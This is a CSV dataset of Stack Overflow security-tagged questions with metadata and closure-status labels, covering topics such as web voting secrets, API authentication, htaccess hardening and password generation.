PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
10638613,05/17/2012 15:22:04,212215,11/16/2009 16:59:42,1918,93,Online Voting System,"I am in a group with a few dozen members. I wrote a quickie web voting system and I'm at a point where I want to add some elements of ""security"" to it. I'm trying to be as bare-bones as possible. What I've done is made it so that a user has to type in a secret string (e.g. GUID) when casting a vote, that I have stored in the database per voter. 

The most secure means I thought of for distributing the secrets to users was to create a bunch of secrets strings in the database, print them out and bring them to a meeting, and have people draw a secret out of a hat. In that way, I believe  I get two principle benefits: (1) I as the author of the voting system, would not be able to identify which individuals voted for what (nor would anyone else for that matter, only the holder of a secret can pull see / change what votes that secret is bound to), and (2) not ""just anyone"" could go and cast votes since the valid secrets are known a priori.

Is there a sound way of emulating that physically present, draw-from-a-hat process virtually, and without compromising the principle benefits outlined above. Maybe it can't be done and at some point there must be trust, or I have to insist on physical presence for someone to ""draw"" a secret (whilst I keep a record of those individuals who have been given a personal secret). 

I also have no idea what to do if someone claims to have lost their secret, since if they are being dishonest and I simply have them draw a new secret, they would effectively have two votes to cast. Without a trace to what the ""lost"" secret was I can't go in and delete the votes associated with it if there were any.

Where I'm at is I think my best option is to basically have people draw new secrets for every vote that take place and distribute secrets through physical presence. Is there a more elegant / automated means of accomplishing the same benefits as outlined above that I'm not aware of yet?",security,voting,web-based,,,05/18/2012 17:18:58,not constructive,1,365,3,"Online Voting System I am in a group with a few dozen members. I wrote a quickie web voting system and I'm at a point where I want to add some elements of ""security"" to it. I'm trying to be as bare-bones as possible. What I've done is made it so that a user has to type in a secret string (e.g. GUID) when casting a vote, that I have stored in the database per voter. 

The most secure means I thought of for distributing the secrets to users was to create a bunch of secrets strings in the database, print them out and bring them to a meeting, and have people draw a secret out of a hat. In that way, I believe  I get two principle benefits: (1) I as the author of the voting system, would not be able to identify which individuals voted for what (nor would anyone else for that matter, only the holder of a secret can pull see / change what votes that secret is bound to), and (2) not ""just anyone"" could go and cast votes since the valid secrets are known a priori.

Is there a sound way of emulating that physically present, draw-from-a-hat process virtually, and without compromising the principle benefits outlined above. Maybe it can't be done and at some point there must be trust, or I have to insist on physical presence for someone to ""draw"" a secret (whilst I keep a record of those individuals who have been given a personal secret). 

I also have no idea what to do if someone claims to have lost their secret, since if they are being dishonest and I simply have them draw a new secret, they would effectively have two votes to cast. Without a trace to what the ""lost"" secret was I can't go in and delete the votes associated with it if there were any.

Where I'm at is I think my best option is to basically have people draw new secrets for every vote that take place and distribute secrets through physical presence. Is there a more elegant / automated means of accomplishing the same benefits as outlined above that I'm not aware of yet?",3
4304923,11/29/2010 14:59:49,99645,05/01/2009 22:14:00,534,30,Is Erlang's security via cookies enough?,"A thing concerning the security of Erlang's ""secret cookie"" mechanism.  
Is that mechanism vulnerable in any way?  
In case it is prone to unintended penetration should that be a concern?
  
What is your practice for making your Erlang nodes and their communication more secure?",security,cookies,erlang,,,,open,0,47,6,"Is Erlang's security via cookies enough? A thing concerning the security of Erlang's ""secret cookie"" mechanism.  
Is that mechanism vulnerable in any way?  
In case it is prone to unintended penetration should that be a concern?
  
What is your practice for making your Erlang nodes and their communication more secure?",3
10730250,05/24/2012 02:10:38,1031791,11/06/2011 02:51:52,315,4,Is it possible to decompress a .rar file without trying passwords with brute force?,"The data is all there. Why can't we create a software to do the same decompiling job Winrar would do, instead of trying to crack it?",security,compression,reverse-engineering,winrar,,05/24/2012 02:55:09,not a real question,1,26,14,"Is it possible to decompress a .rar file without trying passwords with brute force? The data is all there. Why can't we create a software to do the same decompiling job Winrar would do, instead of trying to crack it?",4
4982530,02/13/2011 05:04:59,462951,06/02/2010 11:32:08,85,0,what is communication channel security?,I have searched in google and didnt find any.,security,,,,,02/15/2011 02:37:54,not a real question,1,9,5,what is communication channel security? I have searched in google and didnt find any.,1
7639105,10/03/2011 18:29:12,620429,02/16/2011 21:57:37,65,2,Penetration Testing Wishes,"I'm researching the penetration-testing at the moment. I'm trying to grasp how the computer geeks become security professionals. Obviously, the path isn't easy, because a security professional has to know almost everything there is to know: programming, computer architecture, databases, security, etc. 


So what I would like to know is the following. Since the path of becoming security professional isn't easy, a lot of people just give up in the middle of a learning process (which is usually quite long - years), because they cannot grasp everything they are required to. So why do they really quit (stop learning more and more about security):

1. There's too much they need to know (information gathering, scanning, buffer overflows, etc) and they just give up.
2. They are not qualified enough to find a security-related job, which required more learning, which in turn turns discourages them.
3. They don't know how to perform a penetration test when they actually know enough stuff already. They just need to read/learn a few minor things as they go along (yeah, all penetration testers need to do that, even the most qualified ones), but all-in-all they already know enough. Since they don't know how to perform a penetration test, they don't know that they actually know enough, so that again discourages them.
4) Other?

My guess is that it's mostly the third option, that they don't know how a real-world penetration test is done. And yes, we have to rule out all already established professional penetration testers out there, since the title/topic of this thread don't apply to them. 

What do you guys think, I would appreciate any more reasons, which can I use in my research paper.

Thank you in advance",security,web-security,penetration-testing,penetration-tools,,10/03/2011 18:52:09,off topic,1,280,3,"Penetration Testing Wishes I'm researching the penetration-testing at the moment. I'm trying to grasp how the computer geeks become security professionals. Obviously, the path isn't easy, because a security professional has to know almost everything there is to know: programming, computer architecture, databases, security, etc. 


So what I would like to know is the following. Since the path of becoming security professional isn't easy, a lot of people just give up in the middle of a learning process (which is usually quite long - years), because they cannot grasp everything they are required to. So why do they really quit (stop learning more and more about security):

1. There's too much they need to know (information gathering, scanning, buffer overflows, etc) and they just give up.
2. They are not qualified enough to find a security-related job, which required more learning, which in turn turns discourages them.
3. They don't know how to perform a penetration test when they actually know enough stuff already. They just need to read/learn a few minor things as they go along (yeah, all penetration testers need to do that, even the most qualified ones), but all-in-all they already know enough. Since they don't know how to perform a penetration test, they don't know that they actually know enough, so that again discourages them.
4) Other?

My guess is that it's mostly the third option, that they don't know how a real-world penetration test is done. And yes, we have to rule out all already established professional penetration testers out there, since the title/topic of this thread don't apply to them. 

What do you guys think, I would appreciate any more reasons, which can I use in my research paper.

Thank you in advance",4
10897932,06/05/2012 13:10:06,837623,07/10/2011 13:21:46,1,0,how to choose a security model,"I am looking for the best security model to implement access rights on a website. Objects access should be granted based on the following rules initially:
 - User
 - User Group
 - Hierarchy
 - Permissions (CRUD)

What are the security models I can use and what are the advantages and disadvantages of each one?

Thank you!

",security,permissions,access-rights,,,06/06/2012 14:11:34,not constructive,1,54,6,"how to choose a security model I am looking for the best security model to implement access rights on a website. Objects access should be granted based on the following rules initially:
 - User
 - User Group
 - Hierarchy
 - Permissions (CRUD)

What are the security models I can use and what are the advantages and disadvantages of each one?

Thank you!

",3
9829305,03/22/2012 19:38:38,80869,03/21/2009 14:38:18,4476,130,"Encrypt stack trace on a website, any library to do so?","I want to include sensitive (debug) information on the page in case of errors so that I can collect that information while checking the production app. It is easier to  use than logs.

To make this secure I can:

- show the debug info only when a secret key is in cookies
- encrypt the information on the page and decrypt it using JavaScript in the browser (via extension or just JavaScript included on the page)

The second options looks a bit better as it:

  - makes it possible to ask user to send us the encrypted data with description of the bug
  - does not require https connection to be secure.

The disadvantage of this approach is that you can have some performance issues if you collect debugging data so maybe the best would be to use a combination of both approaches...

###Actual questions: 
- Do you know any library / browser extension that implements such feature?
- Do you know any better way of doing this?
- What do you think about the second idea?",security,debugging,logging,,,03/23/2012 14:52:23,not constructive,1,172,11,"Encrypt stack trace on a website, any library to do so? I want to include sensitive (debug) information on the page in case of errors so that I can collect that information while checking the production app. It is easier to  use than logs.

To make this secure I can:

- show the debug info only when a secret key is in cookies
- encrypt the information on the page and decrypt it using JavaScript in the browser (via extension or just JavaScript included on the page)

The second options looks a bit better as it:

  - makes it possible to ask user to send us the encrypted data with description of the bug
  - does not require https connection to be secure.

The disadvantage of this approach is that you can have some performance issues if you collect debugging data so maybe the best would be to use a combination of both approaches...

###Actual questions: 
- Do you know any library / browser extension that implements such feature?
- Do you know any better way of doing this?
- What do you think about the second idea?",3
7155933,08/23/2011 03:20:27,842006,07/13/2011 05:18:08,148,9,Is this password generator biased?,"Is there a flaw in this command to generate passwords?

`head -c 8 /dev/random | uuencode -m - | sed -n '2s/=*$//;2p'`

After generating a few passwords with it, I started to suspect that it tends to favor certain characters. Of course people are good at seeing patterns where there aren't any, so I decided to test the command on a larger sample. The results are below.

From a sample of 12,000 generated (12-digit) passwords, here are the most and least common letters and how many times they appear.

      TOP 10          BOTTOM 10

    Freq | Char      Freq | Char
    -----|-----      -----|-----
    2751 | I         1833 | p
    2748 | Q         1831 | V
    2714 | w         1825 | 1
    2690 | Y         1821 | r
    2673 | k         1817 | 7
    2642 | o         1815 | R
    2628 | g         1815 | 2
    2609 | 4         1809 | u
    2605 | 8         1791 | P
    2592 | c         1787 | +

So for instance 'I' appears more than 1.5 times as often as '+'.

Is this statistically significant? If so, how can the command be improved?
",security,passwords,statistics,,,08/23/2011 06:16:41,off topic,1,321,5,"Is this password generator biased? Is there a flaw in this command to generate passwords?

`head -c 8 /dev/random | uuencode -m - | sed -n '2s/=*$//;2p'`

After generating a few passwords with it, I started to suspect that it tends to favor certain characters. Of course people are good at seeing patterns where there aren't any, so I decided to test the command on a larger sample. The results are below.

From a sample of 12,000 generated (12-digit) passwords, here are the most and least common letters and how many times they appear.

      TOP 10          BOTTOM 10

    Freq | Char      Freq | Char
    -----|-----      -----|-----
    2751 | I         1833 | p
    2748 | Q         1831 | V
    2714 | w         1825 | 1
    2690 | Y         1821 | r
    2673 | k         1817 | 7
    2642 | o         1815 | R
    2628 | g         1815 | 2
    2609 | 4         1809 | u
    2605 | 8         1791 | P
    2592 | c         1787 | +

So for instance 'I' appears more than 1.5 times as often as '+'.

Is this statistically significant? If so, how can the command be improved?
",3
8550932,12/18/2011 09:50:09,112937,05/27/2009 06:38:57,80,6,Security: How come we still hear about many stack execution security flaws?,"Security: How come we still hear about many stack execution security flaws even though mechanisms such as [NX bit][1] [DEP][2] and [ASLR][3] exist so many years ? 
Have hackers found ways to circumvent these ?

When looking through relatively recent fixed security flaws in MS and Adobe you can still find exploits that give the attacker control of your system - doesn't this imply running code on stack via buffer overrun (which can't be done with DEP/NX/ASLR)?


  [1]: http://en.wikipedia.org/wiki/NX_bit
  [2]: http://en.wikipedia.org/wiki/Data_Execution_Prevention
  [3]: http://en.wikipedia.org/wiki/Address_space_layout_randomization",security,exploit,aslr,nx,dep,05/22/2012 12:59:50,off topic,1,85,12,"Security: How come we still hear about many stack execution security flaws? Security: How come we still hear about many stack execution security flaws even though mechanisms such as [NX bit][1] [DEP][2] and [ASLR][3] exist so many years ? 
Have hackers found ways to circumvent these ?

When looking through relatively recent fixed security flaws in MS and Adobe you can still find exploits that give the attacker control of your system - doesn't this imply running code on stack via buffer overrun (which can't be done with DEP/NX/ASLR)?


  [1]: http://en.wikipedia.org/wiki/NX_bit
  [2]: http://en.wikipedia.org/wiki/Data_Execution_Prevention
  [3]: http://en.wikipedia.org/wiki/Address_space_layout_randomization",5
11080960,06/18/2012 10:26:13,1435484,06/04/2012 15:29:00,1,0,does symmetric encryption vulnerable to plain-text-attacks?,for example bob send a text to boss1 for symmetric encryption to send to boss2 (only boss1 and boss2 know the key). boss1 send encrypted text back to bob to send to boss2. can bob compare the plain text he sent to boss1 with the encrypted version to guess what is for example AES key? ,security,encryption,encryption-symmetric,symmetric,symmetric-key,06/19/2012 03:18:48,off topic,1,56,6,does symmetric encryption vulnerable to plain-text-attacks? for example bob send a text to boss1 for symmetric encryption to send to boss2 (only boss1 and boss2 know the key). boss1 send encrypted text back to bob to send to boss2. can bob compare the plain text he sent to boss1 with the encrypted version to guess what is for example AES key? ,5
7478763,09/20/2011 00:14:41,310370,04/06/2010 20:22:21,623,6,Will secure url be forced on canvas pages?,"Will secure url be forced on canvas pages ?
Or will we able to continue serving our applications from normal urls ?
What exactly will happen.",security,facebook-connect,,,,,open,0,24,8,"Will secure url be forced on canvas pages? Will secure url be forced on canvas pages ?
Or will we able to continue serving our applications from normal urls ?
What exactly will happen.",2
3637302,09/03/2010 15:34:59,413194,08/06/2010 15:02:19,6,1,"InfoPath -how to disable Microsoft Office InfoPath Security Notice - ""Microsoft has identified a potential security concern""","I have an InfoPath form template as a content type in a form library on SharePoint.  The form has several data connections which on submit, save it back to a specific form library on SharePoint depending on how one field is filled out.  

After I added an additional data connection to receive information from SQL to a drop down control, when the form is opened (new or existing), the following Microsoft security message appears ""Microsoft Office InfoPath Security Notice - Microsoft has identified a potential security concern..."".  This warning appears EVERY time. 

I have added these connections as IE Internet Options trusted sites.  In the InfoPath form itself, in Tools>Trust Center, I have unchecked (privacy options) ""check Microsoft Office documents that are from or link to suspicious Web site in InfoPaths Trust Center"". 

None of these actions are solving the problem.  Is there a way to turn this security warning off?",security,warnings,infopath,,,,open,0,156,17,"InfoPath -how to disable Microsoft Office InfoPath Security Notice - ""Microsoft has identified a potential security concern"" I have an InfoPath form template as a content type in a form library on SharePoint.  The form has several data connections which on submit, save it back to a specific form library on SharePoint depending on how one field is filled out.  

After I added an additional data connection to receive information from SQL to a drop down control, when the form is opened (new or existing), the following Microsoft security message appears ""Microsoft Office InfoPath Security Notice - Microsoft has identified a potential security concern..."".  This warning appears EVERY time. 

I have added these connections as IE Internet Options trusted sites.  In the InfoPath form itself, in Tools>Trust Center, I have unchecked (privacy options) ""check Microsoft Office documents that are from or link to suspicious Web site in InfoPaths Trust Center"". 

None of these actions are solving the problem.  Is there a way to turn this security warning off?",3
9462355,02/27/2012 09:00:56,1225994,02/22/2012 13:46:49,13,0,Does Sencha Touch offers any security model?,Does Sencha Touch offers any security model? How compatible it is with custom or other predefined security models like Spring?,security,mobile-application,sencha-touch-2,,,,open,0,20,7,Does Sencha Touch offers any security model? Does Sencha Touch offers any security model? How compatible it is with custom or other predefined security models like Spring?,3
7661662,10/05/2011 12:58:46,980353,10/05/2011 12:39:55,1,0,Best way to implement user verifcation,"we are launching a classified portal. We want to be able to add a verification sticker, badge...to ensure safe transactions. What would be the best way to implement such a structure. 

If a user is banned (scamming, spamming...) how could we make it difficult/tedious for them to create a new account ?

Thanks for your help, we are not looking for a ready made solution, but more towards general aspects and guidelines.



",security,,,,,10/05/2011 13:28:21,off topic,1,71,6,"Best way to implement user verifcation we are launching a classified portal. We want to be able to add a verification sticker, badge...to ensure safe transactions. What would be the best way to implement such a structure. 

If a user is banned (scamming, spamming...) how could we make it difficult/tedious for them to create a new account ?

Thanks for your help, we are not looking for a ready made solution, but more towards general aspects and guidelines.



",1
6625659,07/08/2011 14:09:42,835496,07/08/2011 13:57:50,1,0,Will Authorize.net's Direct Post eliminate your PCI Scope?,"Here is the article about Authorize.net Direct post:
http://developer.practicalecommerce.com/articles/2893-Eliminating-PCI-Scope-with-Authorize-Net-s-Direct-Post-Method

The author is writing as a merchant, wanting to reduce the impact of PCI theorically before implementing technology or services. Thus reducing the need for effective solutions. 

I am a service provider that takes PCI seriously for merchants and do not want to see merchants still getting hacked when they think they are covered. 

I know they want only answers here, but this is a discussion. However the best point about PCI Scope will be the answer. Hopefully by a QSA.

Considering that the form that collects the card data is served up by the merchant in this scenario, not the gateway. Are merchants that use this solution still in PCI Scope for their website/webserver network and processes.

Thanks
",security,web-security,hacking,authorize.net,pci-compliance,09/01/2011 18:21:37,off topic,1,124,8,"Will Authorize.net's Direct Post eliminate your PCI Scope? Here is the article about Authorize.net Direct post:
http://developer.practicalecommerce.com/articles/2893-Eliminating-PCI-Scope-with-Authorize-Net-s-Direct-Post-Method

The author is writing as a merchant, wanting to reduce the impact of PCI theorically before implementing technology or services. Thus reducing the need for effective solutions. 

I am a service provider that takes PCI seriously for merchants and do not want to see merchants still getting hacked when they think they are covered. 

I know they want only answers here, but this is a discussion. However the best point about PCI Scope will be the answer. Hopefully by a QSA.

Considering that the form that collects the card data is served up by the merchant in this scenario, not the gateway. Are merchants that use this solution still in PCI Scope for their website/webserver network and processes.

Thanks
",5
4837973,01/29/2011 16:29:51,440279,09/06/2010 00:57:16,70,2,Home Security system using Windows 7 Desktop and Internet connection,"I'm not happy with my current home security system or monitoring. It's expensive and unreliable.  Sensors requires batteries and motion sensor stopped working.

Anyways... I have this idea.

Using: A simple usb pinhole webcam low quality black and white. A usb controlled relay. A super loud 120v AC siren a some good webcam motion (maybe sound) detecting freware .. or maybe develop it myself.

I know way back I tested motion detecting webcam software that even came with a built in webserver that would run on it's own internet port.  it seemed to work fine. This is like 8 years ago. 

So I'm wondering... Anything good (maybe free) out there that can do this:

- Runs under windows 7
- Serves a webcam page on it's own port with an admin feature that allows you to turn it on or off remotely over web.
- Has a motion and maybe sound detection component that can trigger a custom script to run?


The idea being that the webcam schedules itself to automatically collect and compare images and sounds during weekday work hours and sends an email with an image if motion or sound is detected.

Over the web I'd like to be able to look and listen in on the webcam at any time.

Over the web I'd like to be able to trip 110 volt siren connected to a USB relay. ( I can right the UI for this and does no need to be in that WEBCAM SW)

I've been looking and it seems like all this is doable. 

Any suggestions?
",security,usb,webcam,relay,,01/30/2011 00:22:13,off topic,1,254,10,"Home Security system using Windows 7 Desktop and Internet connection I'm not happy with my current home security system or monitoring. It's expensive and unreliable.  Sensors requires batteries and motion sensor stopped working.

Anyways... I have this idea.

Using: A simple usb pinhole webcam low quality black and white. A usb controlled relay. A super loud 120v AC siren a some good webcam motion (maybe sound) detecting freware .. or maybe develop it myself.

I know way back I tested motion detecting webcam software that even came with a built in webserver that would run on it's own internet port.  it seemed to work fine. This is like 8 years ago. 

So I'm wondering... Anything good (maybe free) out there that can do this:

- Runs under windows 7
- Serves a webcam page on it's own port with an admin feature that allows you to turn it on or off remotely over web.
- Has a motion and maybe sound detection component that can trigger a custom script to run?


The idea being that the webcam schedules itself to automatically collect and compare images and sounds during weekday work hours and sends an email with an image if motion or sound is detected.

Over the web I'd like to be able to look and listen in on the webcam at any time.

Over the web I'd like to be able to trip 110 volt siren connected to a USB relay. ( I can right the UI for this and does no need to be in that WEBCAM SW)

I've been looking and it seems like all this is doable. 

Any suggestions?
",4
6477587,06/25/2011 12:01:11,243225,01/04/2010 14:10:44,1452,36,Cheapest SSL certificate,"What is the cheapest SSL certificate, that is trusted by newest versions of IE, Firefox and Chrome?",security,ssl,certificate,,,06/25/2011 12:15:01,off topic,1,17,3,"Cheapest SSL certificate What is the cheapest SSL certificate, that is trusted by newest versions of IE, Firefox and Chrome?",3
5511589,04/01/2011 09:36:38,635039,02/25/2011 23:50:09,17,2,Securing an API: SSL & HTTP Basic Authentication vs Signiture,"When designing an API for our web app, we'll use the their subdomain as the 'username' and generate an API key/shared secret. Firstly, is it ok to use the subdomain as the username? I don't see the benefit of generating another key.

Different APIs seem to do one of two things:

1. **Use HTTP Basic Authentication with SSL**

In every request the username is set to the subdomain and the password to the API key. Since we're using SSL then this should be safe from spoofing.

Notable APIs: **[Google Checkout][1], [Freshbooks][2], [GitHub][3], [Zendesk][4]**

2. **Create a Signature of the Request with the Shared Secret**

Normally achieved by ordering the key/value pairs and using HMAC-SHA1 with the shared secret to generate the signature. The signature is then sent with the request and verified at the other end.

Notable APIs: **[Google Checkout][5], [Amazon AWS][6]**

PS: thats no mistake, Google Checkout supports both


  [1]: http://checkout.google.com/support/sell/bin/answer.py?hl=en&answer=57519
  [2]: http://developers.freshbooks.com/
  [3]: http://develop.github.com/p/general.html
  [4]: http://www.zendesk.com/api/rest-introduction
  [5]: http://checkout.google.com/support/sell/bin/answer.py?hl=en&answer=57519
  [6]: http://docs.amazonwebservices.com/AmazonS3/latest/dev/index.html?RESTAuthentication.html",security,api,authentication,rest,digital-signature,,open,0,160,10,"Securing an API: SSL & HTTP Basic Authentication vs Signiture When designing an API for our web app, we'll use the their subdomain as the 'username' and generate an API key/shared secret. Firstly, is it ok to use the subdomain as the username? I don't see the benefit of generating another key.

Different APIs seem to do one of two things:

1. **Use HTTP Basic Authentication with SSL**

In every request the username is set to the subdomain and the password to the API key. Since we're using SSL then this should be safe from spoofing.

Notable APIs: **[Google Checkout][1], [Freshbooks][2], [GitHub][3], [Zendesk][4]**

2. **Create a Signature of the Request with the Shared Secret**

Normally achieved by ordering the key/value pairs and using HMAC-SHA1 with the shared secret to generate the signature. The signature is then sent with the request and verified at the other end.

Notable APIs: **[Google Checkout][5], [Amazon AWS][6]**

PS: thats no mistake, Google Checkout supports both


  [1]: http://checkout.google.com/support/sell/bin/answer.py?hl=en&answer=57519
  [2]: http://developers.freshbooks.com/
  [3]: http://develop.github.com/p/general.html
  [4]: http://www.zendesk.com/api/rest-introduction
  [5]: http://checkout.google.com/support/sell/bin/answer.py?hl=en&answer=57519
  [6]: http://docs.amazonwebservices.com/AmazonS3/latest/dev/index.html?RESTAuthentication.html",5
4942814,02/09/2011 08:45:27,57428,01/21/2009 08:23:46,47778,1303,Is the client allowed to choose challenge (nonce) in Digest HTTP authentication?,"Digest authentication looks like a flavor of challenge-response mechanism: theres's a random string which is mixed with the password (MD5 or something) by both the client and the server and only the result of such mixing is sent over the network.

Usually the challenge (""nonce"") is chosen by the server and sent to the client. [Wikipedia article][1] on digest authentication lists a sample ""session"" - the challenge (""nonce"") is chosen by the server there. I tested the same with IIS on my machine - again, the challenge is generated by IIS.

But in some posts [like this one][2] the challenge is generated by the client - the client just generates a random string and sends a request with the challenge and the product of the password and that challenge.

Is the latter allowed and widely accepted? Is the client allowed to choose the challenge (""nonce"")?


  [1]: http://en.wikipedia.org/wiki/Digest_access_authentication
  [2]: https://developer.omniture.com/node/4237",security,http,digest,digest-authentication,,,open,0,148,12,"Is the client allowed to choose challenge (nonce) in Digest HTTP authentication? Digest authentication looks like a flavor of challenge-response mechanism: theres's a random string which is mixed with the password (MD5 or something) by both the client and the server and only the result of such mixing is sent over the network.

Usually the challenge (""nonce"") is chosen by the server and sent to the client. [Wikipedia article][1] on digest authentication lists a sample ""session"" - the challenge (""nonce"") is chosen by the server there. I tested the same with IIS on my machine - again, the challenge is generated by IIS.

But in some posts [like this one][2] the challenge is generated by the client - the client just generates a random string and sends a request with the challenge and the product of the password and that challenge.

Is the latter allowed and widely accepted? Is the client allowed to choose the challenge (""nonce"")?


  [1]: http://en.wikipedia.org/wiki/Digest_access_authentication
  [2]: https://developer.omniture.com/node/4237",4
11189649,06/25/2012 12:45:50,636660,02/27/2011 17:25:02,146,1,How can I prevent scripts from running inside a directory?,"I have a files directory for my image storage in my web root folder, i want to know how to secure that folder. i prevent people from uploading scripts to that folder, i check file extensions, if it is not an image then it will not save to that folder.

but faking extensions are done easily, what happens if someone manage to upload a script to my files directory and access that from the browser

so i need a way to prevent scripts from running inside that folder and only allow images to run.

i know htaccess can do that but i dont know how to set it up. my .htaccess file is like this:

    AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi
    Options -ExecCGI
    ForceType application/octet-stream
    <FilesMatch ""(?i)\.(gif|jpe?g|png)$"">
      ForceType none
    </FilesMatch>
    Options All -Indexes

but it is not working, i saved a php file in that folder then tried to accessed it from the browser and i can still access it. do you know how to make this work? or if you have more secure approach to this, please tell me.

thank you",security,.htaccess,,,,,open,0,205,10,"How can I prevent scripts from running inside a directory? I have a files directory for my image storage in my web root folder, i want to know how to secure that folder. i prevent people from uploading scripts to that folder, i check file extensions, if it is not an image then it will not save to that folder.

but faking extensions are done easily, what happens if someone manage to upload a script to my files directory and access that from the browser

so i need a way to prevent scripts from running inside that folder and only allow images to run.

i know htaccess can do that but i dont know how to set it up. my .htaccess file is like this:

    AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi
    Options -ExecCGI
    ForceType application/octet-stream
    <FilesMatch ""(?i)\.(gif|jpe?g|png)$"">
      ForceType none
    </FilesMatch>
    Options All -Indexes

but it is not working, i saved a php file in that folder then tried to accessed it from the browser and i can still access it. do you know how to make this work? or if you have more secure approach to this, please tell me.

thank you",2
8636833,12/26/2011 14:59:45,1102604,12/16/2011 19:21:21,28,0,htaccess: deny all ip starting with 209.209.209.*,"I use htaccess to block unwanted ips. 
How can I block all ips starting with 209.209.209.*?

Will that work?

    deny from 209.209.209.*",security,.htaccess,,,,12/26/2011 23:18:11,off topic,1,24,7,"htaccess: deny all ip starting with 209.209.209.* I use htaccess to block unwanted ips. 
How can I block all ips starting with 209.209.209.*?

Will that work?

    deny from 209.209.209.*",2
10938140,06/07/2012 18:58:03,319422,04/17/2010 21:31:29,715,25,Delay decryption of a file,"Here's roughly the idea: Alice encrypts a file with key K and gives both to Bob, saying he should only use it to decrypt the file if something happens to Alice. To make sure he doesn't use his key too early, Alice wants to write an algorithm that when Bob tries to decrypt her file, she receives an email, and only if she does not take some action within a certain time (like 48h) will Bob be able to proceed with decrypting the file.

Is such a thing possible at all without a trusted third party?",security,encryption,cryptography,,,06/08/2012 08:00:32,off topic,1,95,5,"Delay decryption of a file Here's roughly the idea: Alice encrypts a file with key K and gives both to Bob, saying he should only use it to decrypt the file if something happens to Alice. To make sure he doesn't use his key too early, Alice wants to write an algorithm that when Bob tries to decrypt her file, she receives an email, and only if she does not take some action within a certain time (like 48h) will Bob be able to proceed with decrypting the file.

Is such a thing possible at all without a trusted third party?",3
10638270,05/17/2012 15:01:22,1401284,05/17/2012 14:56:41,1,0,How to trace any kind of attack on a dedicate server to block it?,"I have a dedicated server and I'm hosting a game + the web page ( apache ) for account registering.

The server is being ddosed since 8 months ago till today. I've tried to talk with the server provider but they couldn't help me.

May I ask if anyone wouldn't mind helping me solve this critical problem.
Maybe adding a program or something to trace the activity and to identify the type of attack ( the source ) then block it? 

Thank you very much",security,,,,,05/17/2012 15:34:13,off topic,1,82,14,"How to trace any kind of attack on a dedicate server to block it? I have a dedicated server and I'm hosting a game + the web page ( apache ) for account registering.

The server is being ddosed since 8 months ago till today. I've tried to talk with the server provider but they couldn't help me.

May I ask if anyone wouldn't mind helping me solve this critical problem.
Maybe adding a program or something to trace the activity and to identify the type of attack ( the source ) then block it? 

Thank you very much",1
10088781,04/10/2012 12:26:11,103604,05/08/2009 14:48:59,417,3,Should Ant be used in production environments?,"Ant is one of my favorite build frameworks, but it makes me cringe when I hear of people using it in production environments to deploy and configure their software. There seems to be a consensus that compilers and C++ build tools such as Make are a security risk on production systems and should not be used for deployments.

Should Ant be used in a secure and hardened production environment?",security,deployment,ant,production-environment,,04/10/2012 12:51:32,not constructive,1,68,7,"Should Ant be used in production environments? Ant is one of my favorite build frameworks, but it makes me cringe when I hear of people using it in production environments to deploy and configure their software. There seems to be a consensus that compilers and C++ build tools such as Make are a security risk on production systems and should not be used for deployments.

Should Ant be used in a secure and hardened production environment?",4
752859,04/15/2009 17:31:58,20875,09/23/2008 03:06:41,67,3,Main security concerns in allowing users embed video,"I wanna allow users to embed videos freely in the application in developing, but do not want to expose then and the application to malicious uses.

With that in mind, what are the main security concerns (XSS, etc) in allowing users to embed videos from external sources, like YouTube, Vimeo, etc. In which way this exploits could be used? What kind of sanitization you guys recommend to apply, before accepting/displaying an embed video?",security,defensive-programming,web-security,,,,open,0,72,8,"Main security concerns in allowing users embed video I wanna allow users to embed videos freely in the application in developing, but do not want to expose then and the application to malicious uses.

With that in mind, what are the main security concerns (XSS, etc) in allowing users to embed videos from external sources, like YouTube, Vimeo, etc. In which way this exploits could be used? What kind of sanitization you guys recommend to apply, before accepting/displaying an embed video?",3
9871424,03/26/2012 11:40:20,1292899,03/26/2012 11:37:08,1,0,How WPA actually works?,Can anyone suggest me some source to study WPA security in wireless. On google search all I get are different ways to crack WPA. ,security,networking,,,,03/27/2012 02:30:32,not a real question,1,25,4,How WPA actually works? Can anyone suggest me some source to study WPA security in wireless. On google search all I get are different ways to crack WPA. ,2
